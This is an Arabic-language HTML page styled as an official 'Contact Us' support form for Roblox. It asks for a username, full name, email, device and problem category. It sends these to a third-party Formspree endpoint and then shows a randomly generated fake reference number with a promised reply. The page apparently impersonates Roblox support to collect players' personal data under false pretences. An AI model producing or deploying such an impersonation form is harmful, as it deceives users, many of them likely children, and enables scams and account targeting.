<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>اتصل بنا - Roblox</title>
<style>
body{font-family:Arial,sans-serif;background:#f7f7f7;direction:rtl;margin:0;padding:0;}
.container{max-width:500px;margin:50px auto;background:#fff;padding:30px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1);}
h2{text-align:center;margin-bottom:20px;}
label{display:block;margin-top:15px;font-weight:bold;}
input,select,textarea,button{width:100%;padding:10px;margin-top:5px;border-radius:5px;border:1px solid #ccc;box-sizing:border-box;}
textarea{resize:none;height:100px;}
button{background:#808080;color:#fff;border:none;margin-top:20px;cursor:pointer;}
button:hover{background:#555;}
</style>
</head>
<body>

<div class="container">
<h2>اتصل بنا</h2>

<form id="contactForm" action="https://formspree.io/f/mayourformid" method="POST">
    <label>اسم المستخدم</label>
    <input type="text" name="username" placeholder="اسم المستخدم">

    <label>الاسم الأول</label>
    <input type="text" name="first_name" placeholder="الاسم الأول">

    <label>الاسم الثاني</label>
    <input type="text" name="last_name" placeholder="الاسم الثاني">

    <label>البريد الإلكتروني</label>
    <input type="email" name="email" placeholder="البريد الإلكتروني" required>

    <label>تأكيد البريد الإلكتروني</label>
    <input type="email" name="confirm_email" placeholder="تأكيد البريد الإلكتروني" required>

    <label>نوع الجهاز</label>
    <select name="device">
        <option value="">اختر النوع</option>
        <option value="pc">كمبيوتر</option>
        <option value="laptop">كمبيوتر محمول</option>
        <option value="android">أندرويد</option>
        <option value="iphone">iPhone</option>
        <option value="tablet_android">تابلت أندرويد</option>
        <option value="ipad">iPad</option>
        <option value="xbox">Xbox</option>
        <option value="ps">PlayStation</option>
        <option value="vr">Meta Quest</option>
        <option value="other">أخرى</option>
    </select>

    <label>نوع فئة المساعدة</label>
    <select name="help_type">
        <option value="">اختر الفئة</option>
        <option value="hacked_account">تم اختراق الحساب</option>
        <option value="login_issue">تعذر تسجيل الدخول</option>
        <option value="robux_purchase">مشتريات Robux</option>
        <option value="robux_refund">استرداد Robux</option>
        <option value="report_abuse">الإبلاغ عن إساءة</option>
        <option value="exploit_report">الإبلاغ عن استغلال</option>
        <option value="dmca">DMCA</option>
        <option value="gift_card">بطاقة الهدايا</option>
        <option value="ideas">أفكار واقتراحات</option>
        <option value="other_help">نصب ممتلكات</option>
    </select>

    <label>يرجى وصف مشكلتك</label>
    <textarea name="message" placeholder="ما هي المشكلة التي تواجهها"></textarea>

    <button type="submit">متابعة</button>
</form>
</div>

<script>
// توليد رقم مرجع عشوائي 7 أرقام
function generateReference(){return Math.floor(1000000 + Math.random()*9000000);}

document.getElementById('contactForm').addEventListener('submit', function(e){
    e.preventDefault();
    const form = e.target;

    // إرسال النموذج إلى Formspree
    fetch(form.action, {
        method: 'POST',
        body: new FormData(form),
        headers: { 'Accept': 'application/json' }
    })
    .then(response => {
        // الصفحة البيضاء مع رسالة ورقم المرجع
        document.body.innerHTML = `
        <div style="text-align:center;margin-top:100px;font-family:Arial,sans-serif;">
            <h2>تم إرسال طلبك</h2>
            <p>ستتلقى رد في غضون 15 يوم</p>
            <p>رقم مرجعك: <strong>${generateReference()}</strong></p>
        </div>`;
    })
    .catch(error => {
        alert('حدث خطأ، حاول مرة أخرى.');
        console.error(error);
    });
});
</script>

</body>
</html>
